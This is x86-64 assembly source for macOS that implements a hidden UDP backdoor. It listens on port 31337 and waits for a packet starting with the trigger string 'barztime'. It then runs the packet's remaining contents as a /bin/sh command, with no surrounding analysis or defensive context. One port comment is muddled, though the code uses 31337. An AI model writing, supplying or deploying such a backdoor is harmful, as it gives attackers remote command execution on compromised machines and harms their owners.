	global start
	default rel

	section .text
start:

	mov rax, 0x2000061 	; socket(2, 2, 0)
	mov rdi, 2 			; AF_INET
	mov rsi, rdi		; SOCK_DGRAM
	xor rdx, rdx
	syscall

	mov r13, rax		; sockfd

	mov rax, 0x2000068			; bind(sockfd, (struct sockaddr *) rawaddress, 16)
	mov rdi, r13
								;char rawaddress[] = { 0, 2, 0x7a, 0x69, 0, 0, 0, 0, 0, 0, 0, 0 };
								; sin_family = 2, sin_port = 27002 (31337),  0 = INADDR_ANY
	push 0x697a0200
	lea rsi, [rsp]
	mov rdx, 16
	syscall


	mov rax, 0x200001d			; recvfrom(sockfd, buffer, 128, 0, 0, 0)
	mov rdi, r13

	mov rcx, 16				; 128 bytes / 8 = 16 entries needed
pushloop:
	push 0x0000000000000000
	loop pushloop

read_from:
	lea rsi, [rsp]
	mov rdx, 128
	xor rcx, rcx
	xor r8, r8
	xor r9, r9
	syscall 

test_for_trigger:
	mov rax, 0x656d69747a726162	; barztime(/bin//sh)
	cmp [rsp], rax

	jne close

execute_command:
	mov rax, 0x200003b		; execve

	add rsp, 8
	lea r14, [rsp]

    cdq                      ; rdx=penv=0
    mov     rbx, [r14]  	 ; barztime/bin//sh
    push    rdx              ; 0
    push    rbx              ; "/bin//sh"
    push    rsp
    pop     rdi              ; rdi="/bin//sh", 0
    push    rdx              ; 0
    push    word '-c'
    push    rsp
    pop     rbx              ; rbx="-c", 0
    push    rdx              ; argv[3]=NULL
    add 	r14, 8
    push 	r14
    push    rbx              ; argv[1]="-c"
    push    rdi              ; argv[0]="/bin//sh"
    push    rsp
    pop     rsi              ; rsi=argv

    syscall



close:
	mov rax, 0x2000006		; close
	mov rdi, r13
	syscall


exit:
	mov rax, 0x2000001
	xor rdi, rdi 
	syscall	

section .data
	d: db "b"


